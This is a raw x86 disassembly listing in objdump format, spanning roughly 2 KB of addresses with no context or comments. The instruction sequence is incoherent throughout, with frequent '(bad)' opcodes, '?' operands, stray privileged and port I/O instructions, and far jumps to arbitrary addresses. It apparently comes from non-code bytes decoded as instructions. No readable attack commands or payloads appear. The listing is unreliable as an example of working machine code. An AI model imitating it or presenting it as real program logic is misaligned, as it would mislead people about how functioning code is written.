  42143b:	mov    bl,0xd7
  42143d:	fstp   st(7)
  42143f:	mov    eax,0x9d402cca
  421444:	sub    ecx,eax
  421446:	ins    BYTE PTR es:[edi],dx
  421447:	dec    eax
  421448:	add    ebp,esi
  42144a:	pop    esp
  42144b:	cli    
  42144c:	pmaxsw mm6,QWORD PTR [ebx+edx*2]
  421450:	cmp    ch,BYTE PTR [edx+0x239e3b4f]
  421456:	lock iret 
  421458:	cs sbb ah,bh
  42145b:	icebp  
  42145c:	dec    esi
  42145d:	inc    ecx
  42145e:	lock sub ecx,DWORD PTR [ebx]
  421461:	cmp    eax,0x6f027b82
  421466:	and    edx,DWORD PTR [edi]
  421468:	lock gs fsub st,st(7)
  42146c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42146d:	ss jmp 0x5a95a097
  421473:	dec    edi
  421474:	mov    bl,0x63
  421476:	fcomi  st,st(4)
  421478:	ror    BYTE PTR [ebp+ebp*2-0x32499bfa],cl
  42147f:	mov    ds:0xc4c392b5,al
  421484:	jo     0x4214ad
  421486:	leave  
  421487:	imul   esp,DWORD PTR [ebp-0x7c1934d8],0x39823f99
  421491:	(bad)  
  421492:	mov    edi,0x8e65a522
  421497:	fcom   DWORD PTR [eax+edx*8+0x26]
  42149b:	adc    ah,dh
  42149d:	mov    WORD PTR [ebx+0x2398559],ss
  4214a3:	in     eax,0xb6
  4214a5:	(bad)  
  4214a6:	jno    0x4214e6
  4214a8:	cmp    BYTE PTR [ebx+ecx*2+0xee97a72],dl
  4214af:	jle    0x4214e1
  4214b1:	ror    BYTE PTR [eax],cl
  4214b3:	jno    0x421465
  4214b5:	jle    0x421535
  4214b7:	test   BYTE PTR [ebx-0x31da1c3a],ah
  4214bd:	pop    ds
  4214be:	xor    edi,esp
  4214c0:	push   edx
  4214c1:	shr    ecx,0x62
  4214c4:	popf   
  4214c5:	dec    ecx
  4214c6:	nop
  4214c7:	jl     0x421548
  4214c9:	mov    DWORD PTR [ecx],eax
  4214cb:	lahf   
  4214cc:	in     al,0x59
  4214ce:	cmovae ecx,DWORD PTR [esi+0x8bdea2e]
  4214d5:	mov    eax,0x6133a412
  4214da:	jle    0x421546
  4214dc:	retf   
  4214dd:	add    eax,0xd1af3228
  4214e2:	jnp    0x4214ff
  4214e4:	or     dl,dl
  4214e6:	pop    esi
  4214e7:	or     DWORD PTR [edx+0x21],0xd7739c1c
  4214ee:	outs   dx,DWORD PTR ds:[esi]
  4214ef:	cli    
  4214f0:	sbb    DWORD PTR [edx+ecx*2-0x15],esp
  4214f4:	fild   QWORD PTR [edi-0x68510be7]
  4214fa:	scas   eax,DWORD PTR es:[edi]
  4214fb:	push   ss
  4214fc:	es jb  0x4214d8
  4214ff:	pop    edx
  421500:	jp     0x421483
  421502:	mov    cl,0xd2
  421504:	lea    edx,[ecx+0x646f16ec]
  42150a:	jge    0x4214cd
  42150c:	setl   BYTE PTR [edi-0xa]
  421510:	loopne 0x4214f1
  421512:	repnz mov DWORD PTR [eax-0x1],ecx
  421516:	imul   ebp,DWORD PTR [eax-0x23],0xd130de56
  42151d:	xor    al,0x69
  42151f:	mov    ecx,0x54796d7c
  421524:	retf   0xb685
  421527:	or     edx,DWORD PTR [edx+ebp*8+0x51]
  42152b:	dec    ebp
  42152c:	clc    
  42152d:	retf   0x98d9
  421530:	mov    WORD PTR [edx+eax*2],?
  421533:	cmp    al,0x81
  421535:	dec    esi
  421536:	das    
  421537:	scas   al,BYTE PTR es:[edi]
  421538:	test   al,0xbd
  42153a:	mov    dh,0x29
  42153c:	data16 sbb ah,BYTE PTR [edi+0x61c46bf9]
  421543:	lock or dl,cl
  421546:	(bad)  
  421547:	dec    ebx
  421548:	stc    
  421549:	and    edx,DWORD PTR [esi-0xd39e20a]
  42154f:	mov    bl,0x1b
  421551:	pop    esp
  421552:	mov    eax,ds:0x7ca98542
  421557:	(bad)  
  421558:	push   0x3c95bd34
  42155d:	pop    ecx
  42155e:	nop
  42155f:	dec    esi
  421560:	push   edx
  421561:	pop    ds
  421562:	retf   0x9c5d
  421565:	pop    ss
  421566:	fwait
  421567:	xchg   al,ah
  421569:	mov    ds:0x52397005,eax
  42156e:	xlat   BYTE PTR ds:[ebx]
  42156f:	les    ebp,FWORD PTR [esi+edx*2-0x310d1664]
  421576:	jmp    0x27a344fd
  42157b:	jle    0x421532
  42157d:	xor    bl,BYTE PTR [eax+0x18fa1403]
  421583:	pop    ebx
  421584:	mov    ds:0xd6b7595e,eax
  421589:	jmp    FWORD PTR [esp+edi*1+0x4cd91d32]
  421590:	add    BYTE PTR ds:0xd9408757,0xea
  421597:	cs fwait
  421599:	rol    DWORD PTR [ecx-0x37e6e092],cl
  42159f:	scas   eax,DWORD PTR es:[edi]
  4215a0:	sbb    eax,0xabd8177f
  4215a5:	jmp    0xfcc19364
  4215aa:	sub    DWORD PTR [edx-0x3d],ebp
  4215ad:	loop   0x421608
  4215af:	jae    0x42160d
  4215b1:	loopne 0x421589
  4215b3:	and    BYTE PTR [edi+0xc140e64],al
  4215b9:	add    al,0x19
  4215bb:	pushf  
  4215bc:	addr16 mov eax,0xce7222e0
  4215c2:	mov    dh,BYTE PTR [esi+0x53232d85]
  4215c8:	xchg   ebp,esp
  4215ca:	dec    ebp
  4215cb:	xchg   ecx,eax
  4215cc:	inc    eax
  4215cd:	scas   eax,DWORD PTR es:[edi]
  4215ce:	repnz sub BYTE PTR ds:0x32c7bbb4,ah
  4215d5:	aaa    
  4215d6:	add    BYTE PTR [eax-0x1b],0x35
  4215da:	repz pop eax
  4215dc:	sbb    DWORD PTR [edx-0x1a73c0c4],ebx
  4215e2:	mov    edi,0x7df8efb6
  4215e7:	xor    ah,dl
  4215e9:	add    dl,BYTE PTR [esi]
  4215eb:	test   BYTE PTR [eax],al
  4215ed:	outs   dx,DWORD PTR ds:[esi]
  4215ee:	xchg   ebx,eax
  4215ef:	push   cs
  4215f0:	sub    edi,DWORD PTR [ebx-0xbf59742]
  4215f6:	ins    BYTE PTR es:[edi],dx
  4215f7:	and    bl,BYTE PTR [ebp+0xa09bd8b]
  4215fd:	dec    edi
  4215fe:	fisubr WORD PTR [ecx+0x157df736]
  421604:	inc    ebx
  421605:	inc    esp
  421606:	ret    
  421607:	ds add cl,dl
  42160a:	add    ebx,DWORD PTR [ebx+0x3c161a19]
  421610:	xchg   esp,eax
  421611:	ret    0x4381
  421614:	mov    dl,0xe3
  421616:	test   eax,0x6680a9d4
  42161b:	jne    0x421634
  42161d:	rcl    BYTE PTR [edi+ebp*1-0x47],1
  421621:	inc    ebp
  421622:	(bad)  
  421623:	lds    ebx,FWORD PTR [edi]
  421625:	in     al,0x25
  421627:	inc    ebp
  421628:	mov    dl,bl
  42162a:	mov    BYTE PTR [eax+0x34],ch
  42162d:	sahf   
  42162e:	mov    ch,0x31
  421630:	fistp  WORD PTR [edi]
  421632:	push   esp
  421633:	jp     0x4215b9
  421635:	and    bh,0x93
  421638:	rol    BYTE PTR [eax+0x74],cl
  42163b:	push   ds
  42163c:	push   0xffffffa0
  42163e:	pop    edx
  42163f:	push   edi
  421640:	adc    edi,DWORD PTR [ebx+0x72e7f0aa]
  421646:	dec    edx
  421647:	mov    BYTE PTR [edi],ch
  421649:	mov    cl,0xe3
  42164b:	das    
  42164c:	sbb    al,0xd2
  42164e:	popf   
  42164f:	and    eax,0x799cb9d8
  421654:	pop    edx
  421655:	ja     0x4215d8
  421657:	jle    0x4215e9
  421659:	clc    
  42165a:	jl     0x42162a
  42165c:	mov    ebp,edx
  42165e:	scas   eax,DWORD PTR es:[edi]
  42165f:	js     0x42168f
  421661:	(bad)  
  421662:	scas   eax,DWORD PTR es:[edi]
  421663:	xchg   BYTE PTR [edx],ah
  421665:	xor    esi,DWORD PTR [edi+0x10846d5b]
  42166b:	or     DWORD PTR [ecx],edi
  42166d:	push   cs
  42166e:	(bad)  
  42166f:	mov    ah,0xd
  421671:	fwait
  421672:	sbb    BYTE PTR [ecx+edi*8-0x70],0xc0
  421677:	stos   BYTE PTR es:[edi],al
  421678:	sub    esp,DWORD PTR [ecx+0x395075a7]
  42167e:	scas   eax,DWORD PTR es:[edi]
  42167f:	popa   
  421680:	adc    cl,0x54
  421683:	jb     0x4216f5
  421685:	jns    0x4216dd
  421687:	push   ds
  421688:	daa    
  421689:	out    dx,al
  42168a:	xchg   edi,eax
  42168b:	mov    esp,0xa9d6b04b
  421690:	jmp    0x421687
  421692:	mov    al,ds:0x24115f41
  421697:	pop    eax
  421698:	sbb    DWORD PTR [edx+ecx*1],ebx
  42169b:	jbe    0x421642
  42169d:	pop    es
  42169e:	xchg   ebp,eax
  42169f:	ret    0x684c
  4216a2:	in     al,0x32
  4216a4:	in     al,0xc5
  4216a6:	push   ds
  4216a7:	popa   
  4216a8:	pop    edx
  4216a9:	ja     0x421658
  4216ab:	repz mov ds:0x958376f7,eax
  4216b1:	shr    BYTE PTR [edi],1
  4216b3:	inc    esp
  4216b4:	fist   DWORD PTR [edi]
  4216b6:	ja     0x4216b9
  4216b8:	aas    
  4216b9:	hlt    
  4216ba:	pop    edi
  4216bb:	adc    al,0xa9
  4216bd:	cli    
  4216be:	(bad)  
  4216bf:	aaa    
  4216c0:	mov    ecx,0x9b77a889
  4216c5:	and    al,BYTE PTR [ebp+0x1670b3d7]
  4216cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216cc:	sub    eax,0xc1a1bf9a
  4216d1:	jb     0x42168f
  4216d3:	mov    ecx,0xd538b8e6
  4216d8:	div    esi
  4216da:	cmp    esp,ecx
  4216dc:	pop    ds
  4216dd:	mov    edi,0xe28861b8
  4216e2:	cmp    eax,0x6ee39cbd
  4216e7:	aam    0x16
  4216e9:	out    0xa9,al
  4216eb:	and    DWORD PTR [eax+0x4f],edi
  4216ee:	bound  ebp,QWORD PTR [eax-0x1e]
  4216f1:	jae    0x4216a3
  4216f3:	jno    0x421751
  4216f5:	stc    
  4216f6:	mov    dh,0x96
  4216f8:	sub    dh,cl
  4216fa:	out    dx,al
  4216fb:	sub    ch,BYTE PTR [eax-0x859cf62]
  421701:	call   0x978c8bd3
  421706:	or     ebx,0xc9383b99
  42170c:	add    esp,DWORD PTR [eax]
  42170e:	das    
  42170f:	lods   eax,DWORD PTR ds:[esi]
  421710:	es mov al,0x65
  421713:	or     eax,0x19607e90
  421718:	hlt    
  421719:	mov    WORD PTR [ebp+esi*2+0x25],ds
  42171d:	popa   
  42171e:	iret   
  42171f:	pusha  
  421720:	and    DWORD PTR [ebx+0x4c4ed216],0x463cdbcc
  42172a:	push   es
  42172b:	mov    ds:0xb9e915d9,eax
  421730:	aam    0x5b
  421732:	pushf  
  421733:	shl    bh,cl
  421735:	test   al,0x0
  421737:	(bad)  
  421738:	sub    al,0x49
  42173a:	xor    dl,bh
  42173c:	ins    BYTE PTR es:[edi],dx
  42173d:	pop    esp
  42173e:	push   ds
  42173f:	retf   
  421740:	add    ecx,esp
  421742:	dec    ebp
  421743:	int    0x44
  421745:	mov    esp,eax
  421747:	aam    0x2
  421749:	fadd   QWORD PTR [ecx-0x58]
  42174c:	cmp    al,0x57
  42174e:	pop    esp
  42174f:	push   0xffffffe5
  421751:	xlat   BYTE PTR ds:[ebx]
  421752:	retf   0x9dc4
  421755:	mov    al,ds:0xc9d39b0a
  42175a:	mov    al,ds:0xeab0e27f
  42175f:	add    ebp,DWORD PTR [eax+ecx*1+0x43dbd14f]
  421766:	mul    DWORD PTR [ebp+0x25]
  421769:	inc    ebx
  42176a:	rol    DWORD PTR [ebx+0x554d70cc],cl
  421770:	mov    esi,0xb3160d8b
  421775:	call   0x58bc:0x4b2a938b
  42177c:	cmp    esi,ebp
  42177e:	in     al,0x59
  421780:	arpl   ax,ax
  421782:	outs   dx,BYTE PTR ds:[esi]
  421783:	jl     0x4217bd
  421785:	pop    es
  421786:	loopne 0x42174c
  421788:	sbb    al,BYTE PTR [edx+0x79]
  42178b:	xchg   BYTE PTR [ebx],ah
  42178d:	adc    al,0x1b
  42178f:	(bad)  
  421790:	rcl    cl,1
  421792:	jno    0x421722
  421794:	dec    eax
  421795:	icebp  
  421796:	stc    
  421797:	outs   dx,BYTE PTR ds:[esi]
  421798:	pop    esi
  421799:	sub    BYTE PTR [ecx-0x7f0b0860],ch
  42179f:	mov    dl,0xd9
  4217a1:	jle    0x4217f8
  4217a3:	push   edx
  4217a4:	xchg   ebp,eax
  4217a5:	cmp    ecx,DWORD PTR [edx]
  4217a7:	inc    esi
  4217a8:	adc    edx,DWORD PTR [ecx-0x76]
  4217ab:	mov    esi,0x252f33d0
  4217b0:	xchg   DWORD PTR [ebx+ebx*4],ebx
  4217b3:	dec    eax
  4217b4:	or     BYTE PTR [ecx+ecx*8-0x391ca39f],bh
  4217bb:	add    esi,DWORD PTR [ebp+0x61]
  4217be:	xchg   ecx,eax
  4217bf:	push   es
  4217c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217c1:	fmul   DWORD PTR [ebp+0x1f]
  4217c4:	mov    al,0xb7
  4217c6:	cld    
  4217c7:	dec    esi
  4217c9:	ins    DWORD PTR es:[edi],dx
  4217ca:	pop    es
  4217cb:	leave  
  4217cc:	mov    edi,DWORD PTR fs:[ecx+0x5f]
  4217d0:	and    ebx,DWORD PTR [edx+0x63b9f405]
  4217d6:	jbe    0x421772
  4217d8:	bswap  ebp
  4217da:	(bad)  
  4217db:	leave  
  4217dc:	push   esi
  4217dd:	jne    0x42180f
  4217df:	setb   BYTE PTR [edx+0x306fa007]
  4217e6:	rcl    DWORD PTR [ecx-0x39],1
  4217e9:	imul   esp,DWORD PTR [esi-0x21de97f3],0xffffffe5
  4217f0:	add    BYTE PTR [eax+0xa610fa2],bh
  4217f6:	pop    esi
  4217f7:	dec    esi
  4217f8:	mov    bl,0x54
  4217fa:	xor    ecx,ebp
  4217fc:	les    edi,FWORD PTR [ebx]
  4217fe:	outs   dx,BYTE PTR fs:[esi]
  421800:	jmp    0x42185a
  421802:	inc    BYTE PTR [ebx]
  421804:	test   DWORD PTR [edx-0x11b96f45],ebp
  42180a:	or     BYTE PTR [edi-0x37],dh
  42180d:	cld    
  42180e:	ret    0x908d
  421811:	adc    DWORD PTR [eax+edx*2-0x47d5852d],edx
  421818:	das    
  421819:	outs   dx,BYTE PTR ds:[esi]
  42181a:	sub    esp,DWORD PTR [ecx+0x7886028b]
  421820:	data16 icebp 
  421822:	daa    
  421823:	(bad)  
  421824:	rcr    BYTE PTR [ebx+0x560d1417],0x36
  42182b:	cli    
  42182c:	(bad)  
  42182d:	xchg   esp,eax
  42182e:	xchg   edx,eax
  42182f:	into   
  421830:	push   eax
  421831:	je     0x42188d
  421833:	(bad)  
  421834:	cld    
  421835:	dec    ebx
  421836:	sbb    eax,0x6f905890
  42183b:	cli    
  42183c:	adc    eax,0xf85ae58e
  421841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421842:	cli    
  421843:	pop    edi
  421844:	stc    
  421845:	ja     0x4217fd
  421847:	leave  
  421848:	jge    0x421846
  42184a:	add    BYTE PTR [esi-0x52],ah
  42184d:	jb     0x4218bf
  42184f:	xor    DWORD PTR [esi],eax
  421851:	fnstsw WORD PTR [eax+0x28]
  421854:	cmp    bh,BYTE PTR [ebp+0x7f2e1e60]
  42185a:	fcomi  st,st(3)
  42185c:	cmp    BYTE PTR [ebp+0x2ad29f11],bl
  421862:	dec    edx
  421863:	sbb    BYTE PTR [ebx],dh
  421865:	ins    BYTE PTR es:[edi],dx
  421866:	add    al,0x61
  421868:	xchg   esi,edi
  42186a:	ret    0x18eb
  42186d:	sahf   
  42186e:	mov    ?,eax
  421870:	xor    ecx,DWORD PTR [eax-0x63f42541]
  421876:	shl    BYTE PTR [ebx+0x5e10222c],cl
  42187c:	and    al,0x1
  42187e:	outs   dx,DWORD PTR ds:[esi]
  42187f:	aas    
  421880:	push   ds
  421881:	repnz mov eax,ds:0xf8d7e2de
  421887:	jmp    0xca1:0xf6bed7f3
  42188e:	hlt    
  42188f:	or     bh,bh
  421891:	jl     0x4218d5
  421893:	push   ebx
  421894:	out    0xfd,al
  421896:	lea    edi,[edx+0x174d08c4]
  42189c:	(bad)  
  42189d:	loope  0x421823
  42189f:	sub    BYTE PTR [edi-0x5911ea7a],ch
  4218a5:	cdq    
  4218a6:	or     eax,0x2fa0415a
  4218ab:	fcmovbe st,st(2)
  4218ad:	out    dx,al
  4218ae:	shl    DWORD PTR [ecx+0x12cf2a95],cl
  4218b4:	popa   
  4218b5:	mov    edx,0xedbc7020
  4218ba:	push   edx
  4218bb:	ds sub ecx,esp
  4218be:	out    dx,eax
  4218bf:	lahf   
  4218c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218c1:	dec    ebp
  4218c2:	dec    eax
  4218c3:	lea    eax,[ecx]
  4218c5:	inc    esi
  4218c6:	and    BYTE PTR [esi+0x5d],ch
  4218c9:	jge    0x421919
  4218cb:	xor    ch,BYTE PTR [esi+eiz*8-0x31]
  4218cf:	jp     0x421898
  4218d1:	aam    0x34
  4218d3:	mov    bh,0x63
  4218d5:	jno    0x42193f
  4218d7:	jae    0x4218a4
  4218d9:	inc    eax
  4218da:	pop    eax
  4218db:	ja     0x42185f
  4218dd:	popf   
  4218de:	and    dh,BYTE PTR [esi+0x6a]
  4218e1:	call   0x6c47:0x1d94883f
  4218e8:	inc    edi
  4218e9:	lock in al,dx
  4218eb:	out    dx,al
  4218ec:	icebp  
  4218ed:	bound  esp,QWORD PTR [ecx]
  4218ef:	pushf  
  4218f0:	jmp    0x97591f95
  4218f5:	lods   eax,DWORD PTR ds:[esi]
  4218f6:	mov    bh,0x95
  4218f8:	jg     0x421936
  4218fa:	mov    esp,0x15114f92
  4218ff:	or     DWORD PTR [ebx],edi
  421901:	mov    esi,0x341f187a
  421906:	cmp    eax,0x8ca4cebc
  42190b:	fadd   QWORD PTR [edi-0x5651fcc2]
  421911:	and    eax,0x5ca455d3
  421916:	xchg   esi,eax
  421917:	jb     0x421972
  421919:	out    dx,al
  42191a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42191b:	ror    BYTE PTR [ebp-0x4a9e8d6a],0x2f
  421922:	cdq    
  421923:	div    BYTE PTR [ebx-0x3b0a66a8]
  421929:	clc    
  42192a:	mov    BYTE PTR [eax],al
  42192c:	dec    ebx
  42192d:	or     al,0xeb
  42192f:	(bad)  
  421930:	test   DWORD PTR [edx],0xda3d8ee8
  421936:	sub    al,0x74
  421938:	test   edx,0xfb0fc96b
  42193e:	into   
  42193f:	jle    0x4218ed
  421941:	xor    eax,0x3120c2ed
  421946:	add    DWORD PTR [ecx*4+0x2240b8ed],0xffffffb4
  42194e:	clc    
  42194f:	(bad)  
  421950:	addr16 xchg esp,eax
  421952:	(bad)  
  421953:	arpl   WORD PTR [ecx+0x6cd2ddd4],di
  421959:	jg     0x4219cc
  42195b:	fiadd  DWORD PTR [edi-0x5d9e46a7]
  421961:	std    
  421962:	test   eax,0x9fccd185
  421967:	ins    BYTE PTR es:[edi],dx
  421968:	imul   edi,edi,0xffffff94
  42196b:	push   ecx
  42196c:	mov    bh,0x66
  42196e:	aam    0xbe
  421970:	mov    dl,0x9f
  421972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421973:	mov    bh,0x81
  421975:	scas   al,BYTE PTR es:[edi]
  421976:	test   DWORD PTR [edi+0x4fe206b1],edx
  42197c:	es pop ecx
  42197e:	sahf   
  42197f:	or     ebp,ebx
  421981:	push   0x4255f1d0
  421986:	fdiv   QWORD PTR [edi-0x63]
  421989:	aad    0x32
  42198b:	xchg   BYTE PTR [ebp-0x63],bl
  42198e:	mov    bl,0x4e
  421990:	xlat   BYTE PTR ds:[ebx]
  421991:	push   edi
  421992:	arpl   dx,cx
  421994:	fiadd  DWORD PTR ds:[ebx]
  421997:	sbb    al,BYTE PTR [ecx]
  421999:	jp     0x421962
  42199b:	push   ds
  42199c:	mov    eax,0x7bcc37ea
  4219a1:	or     esi,DWORD PTR [edi]
  4219a3:	mul    DWORD PTR [edi+eiz*2]
  4219a6:	sbb    edx,edi
  4219a8:	or     ah,BYTE PTR [eax+0x1]
  4219ab:	inc    esi
  4219ac:	mov    esp,eax
  4219ae:	xor    cl,BYTE PTR [edi+0x53a45659]
  4219b4:	nop
  4219b5:	pop    ecx
  4219b6:	lock and eax,0x4c22b94c
  4219bc:	ja     0x42193e
  4219be:	addr16 push 0xffffff84
  4219c1:	and    al,0xc
  4219c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219c4:	icebp  
  4219c5:	ret    0xb064
  4219c8:	hlt    
  4219c9:	dec    edi
  4219ca:	jo     0x4219d9
  4219cc:	jecxz  0x421997
  4219ce:	adc    eax,0x6f8237ba
  4219d3:	push   ds
  4219d4:	mov    edi,DWORD PTR [ecx]
  4219d6:	call   0x928f43a
  4219db:	sub    cl,al
  4219dd:	sahf   
  4219de:	mov    ebp,esp
  4219e0:	push   edx
  4219e1:	shr    BYTE PTR [ebx+esi*8],0x46
  4219e5:	dec    ebx
  4219e6:	movhlps xmm5,xmm5
  4219e9:	mov    es,WORD PTR ds:0x625cfe67
  4219ef:	jb     0x421a21
  4219f1:	rol    BYTE PTR [edi+0x77f9beef],cl
  4219f7:	loopne 0x421a65
  4219f9:	mov    ?,WORD PTR [esi+0x3d967e29]
  4219ff:	jbe    0x421a6e
  421a01:	ss mov edx,0x8292f5cd
  421a07:	pop    esp
  421a08:	enter  0x8edd,0x28
  421a0c:	xlat   BYTE PTR ds:[ebx]
  421a0d:	cmp    eax,0xc800b048
  421a12:	out    0x54,eax
  421a14:	ret    
  421a15:	ins    BYTE PTR es:[edi],dx
  421a16:	xor    BYTE PTR [eax*1-0x3a6f54ab],bh
  421a1d:	adc    DWORD PTR [esi+0xe209666],0x4b
  421a24:	popa   
  421a25:	aam    0xc9
  421a27:	loopne 0x421a24
  421a29:	retf   0x9b92
  421a2c:	adc    BYTE PTR [eax+ebx*1-0x861c9b3],0xa4
  421a34:	sub    cl,BYTE PTR [esi-0x71688194]
  421a3a:	adc    esp,ecx
  421a3c:	in     al,0x77
  421a3e:	fbstp  TBYTE PTR [ecx-0x4c]
  421a41:	jmp    0x55aed7db
  421a46:	mov    es:0x77cc1187,eax
  421a4c:	push   0x2a
  421a4e:	push   ebx
  421a4f:	jns    0x421a16
  421a51:	test   al,0xc4
  421a53:	push   edx
  421a54:	je     0x421a57
  421a56:	loopne 0x421a53
  421a58:	test   BYTE PTR [edi+0x3cd0ae7e],dl
  421a5e:	dec    BYTE PTR [eax]
  421a60:	sub    eax,0x284032cb
  421a65:	sub    eax,DWORD PTR [eax-0x17e7bdff]
  421a6b:	xor    DWORD PTR [esi+0x6f],esi
  421a6e:	add    eax,0xf82eabf1
  421a73:	adc    cl,cl
  421a75:	inc    esp
  421a76:	push   ecx
  421a77:	inc    esp
  421a78:	lock mov esp,0x1f6ce69a
  421a7e:	add    DWORD PTR [ecx+0x38],edi
  421a81:	pop    ss
  421a82:	call   0x60b1726e
  421a87:	pop    ss
  421a88:	jns    0x421a73
  421a8a:	cmp    BYTE PTR [ecx+0x21],ah
  421a8d:	push   eax
  421a8e:	dec    DWORD PTR [eax-0x3db47193]
  421a94:	mov    bh,0x4
  421a96:	shl    DWORD PTR [ecx-0x344c253e],cl
  421a9c:	or     al,0x42
  421a9e:	daa    
  421a9f:	gs fs cmp al,0x64
  421aa3:	ror    BYTE PTR [ecx+0x70],0x2a
  421aa7:	(bad)  
  421aa8:	aaa    
  421aa9:	or     BYTE PTR [ebp-0x62870c91],cl
  421aaf:	inc    esi
  421ab0:	pop    edi
  421ab1:	(bad)  
  421ab2:	xchg   esp,eax
  421ab3:	out    dx,eax
  421ab4:	aaa    
  421ab5:	leave  
  421ab6:	pop    esi
  421ab7:	data16 hlt 
  421ab9:	push   eax
  421aba:	cmp    esi,DWORD PTR [edx-0x79560d1]
  421ac0:	daa    
  421ac1:	push   0x697b08fb
  421ac6:	(bad)  
  421ac7:	fcom   st(6)
  421ac9:	jne    0x421b0d
  421acb:	adc    al,0xd2
  421acd:	in     al,dx
  421ace:	std    
  421acf:	push   ds
  421ad0:	cmp    dh,BYTE PTR [esi+0x3c23a347]
  421ad6:	and    eax,0xd6323f6
  421adb:	call   0xe29a:0x7f4f1310
  421ae2:	mov    ch,0xd6
  421ae4:	push   ds
  421ae5:	loope  0x421add
  421ae7:	mov    esi,0xa165f77c
  421aec:	sbb    bh,BYTE PTR [edx+0x20]
  421aef:	sbb    DWORD PTR [eax],eax
  421af1:	jp     0x421a85
  421af3:	dec    edx
  421af4:	scas   al,BYTE PTR es:[edi]
  421af5:	dec    eax
  421af6:	cmp    ch,BYTE PTR [edx-0x3490e26f]
  421afc:	push   edi
  421afd:	dec    edi
  421afe:	push   esi
  421aff:	lock fs mov edi,0xeb728e4d
  421b06:	jo     0x421afc
  421b08:	cmp    eax,0x99d17f7
  421b0d:	repnz sub al,0x7c
  421b10:	jp     0x421ab3
  421b12:	cmp    ecx,DWORD PTR [ebp-0x1ad781e1]
  421b18:	pop    ebx
  421b19:	es popf 
  421b1b:	mov    eax,DWORD PTR [eax-0x55e1a56d]
  421b21:	inc    BYTE PTR [ecx]
  421b23:	inc    esp
  421b24:	lds    eax,FWORD PTR [ebx+0x411be5bd]
  421b2a:	cdq    
  421b2b:	inc    edx
  421b2c:	and    eax,0xacfb52ce
  421b31:	push   0xf80d96d4
  421b36:	inc    edx
  421b37:	or     DWORD PTR [ecx],0x3f
  421b3a:	mov    eax,0x8c24efe7
  421b3f:	inc    edi
  421b40:	mov    ds:0xac3c25a9,eax
  421b45:	mov    ch,ch
  421b47:	mov    edx,DWORD PTR [ecx]
  421b49:	jbe    0x421b4c
  421b4b:	pop    esp
  421b4c:	mov    DWORD PTR [eax],eax
  421b4e:	mov    edi,0xa8c01380
  421b53:	ins    BYTE PTR es:[edi],dx
  421b54:	test   al,0x19
  421b56:	aad    0x94
  421b58:	xchg   esi,eax
  421b59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b5a:	push   ss
  421b5b:	mov    edi,0x7c322934
  421b60:	mov    WORD PTR [esi+0x16],gs
  421b63:	push   ebp
  421b64:	mov    al,0xdb
  421b66:	bound  edi,QWORD PTR [edi+0x595e81ff]
  421b6c:	fwait
  421b6d:	mov    al,ds:0x64af59f6
  421b72:	dec    ebx
  421b73:	out    0x6d,al
  421b75:	xchg   ebp,eax
  421b76:	sbb    eax,0xf6c56f5f
  421b7b:	sub    bl,BYTE PTR [ecx]
  421b7d:	dec    esp
  421b7e:	cmp    BYTE PTR [edi+0x24896c6],dh
  421b84:	cwde   
  421b85:	repz push ecx
  421b87:	int    0xcf
  421b89:	sbb    DWORD PTR [ecx+0x4804a364],edx
  421b8f:	sbb    eax,0xb3692b5b
  421b94:	in     al,dx
  421b95:	lahf   
  421b96:	js     0x421b3e
  421b98:	jae    0x421b8a
  421b9a:	inc    ebx
  421b9b:	ja     0x421bed
  421b9d:	mov    ecx,0x80f3d360
  421ba2:	or     eax,0x2c82895a
  421ba7:	cwde   
  421ba8:	popf   
  421ba9:	xchg   ecx,eax
  421baa:	jno    0x421bda
  421bac:	cmp    BYTE PTR [eax+0xc],0x1b
  421bb0:	scas   eax,DWORD PTR es:[edi]
  421bb1:	sbb    DWORD PTR [ebx-0x4565f55f],0x9362ad38
  421bbb:	adc    ch,BYTE PTR [edx]
  421bbd:	sbb    BYTE PTR [ecx-0x29],cl
  421bc0:	mov    dh,0x54
  421bc2:	scas   eax,DWORD PTR es:[edi]
  421bc3:	mov    ecx,0x4a4873c9
  421bc8:	jne    0x421b68
  421bca:	xchg   esi,eax
  421bcb:	inc    eax
  421bcc:	es int3 
  421bce:	data16 shr ch,1
  421bd1:	xchg   BYTE PTR [edi],bl
  421bd3:	xchg   esp,eax
  421bd4:	add    DWORD PTR [edx-0x1],esp
  421bd7:	into   
  421bd8:	adc    BYTE PTR [ebx-0x768382fd],ah
  421bde:	mov    ah,0x5b
  421be0:	dec    ecx
  421be1:	dec    edi
  421be2:	pop    es
  421be3:	dec    ebx
  421be4:	stos   DWORD PTR es:[edi],eax
  421be5:	pop    edx
  421be6:	pop    ebx
  421be7:	lahf   
  421be8:	rcr    edi,cl
  421bea:	aam    0x6e
  421bec:	push   ds
  421bed:	enter  0x6a11,0xcc
  421bf1:	and    ebp,DWORD PTR [ebx]
  421bf3:	cmp    eax,0x9d86856d
  421bf8:	hlt    
  421bf9:	push   eax
  421bfa:	ins    DWORD PTR es:[edi],dx
  421bfb:	inc    edx
  421bfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bfd:	cdq    
  421bfe:	add    bh,BYTE PTR [ebp-0xffe550b]
  421c04:	ret    0x2cd9
  421c07:	cdq    
  421c08:	lock stc 
  421c0a:	jo     0x421ba0
  421c0c:	push   ebx
  421c0d:	enter  0xddca,0x70
  421c11:	mov    bl,0xb8
  421c13:	mov    al,0xdb
  421c15:	pop    ds
  421c16:	(bad)  
  421c17:	scas   al,BYTE PTR es:[edi]
  421c18:	arpl   ax,sp
  421c1a:	xchg   ebx,eax
  421c1b:	leave  
  421c1c:	pop    esp
  421c1d:	dec    ebx
  421c1e:	call   0xd321:0x207b0db6
  421c25:	pop    ebx
  421c26:	add    DWORD PTR [eax-0x50],ecx
  421c29:	lea    esp,[edi-0x56629fb2]
  421c2f:	xor    esp,DWORD PTR [ecx-0x60]
  421c32:	mov    edx,0xf7f95837
  421c37:	cld    
  421c38:	sbb    eax,0xb19a5be5
  421c3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c3e:	js     0x421c8f
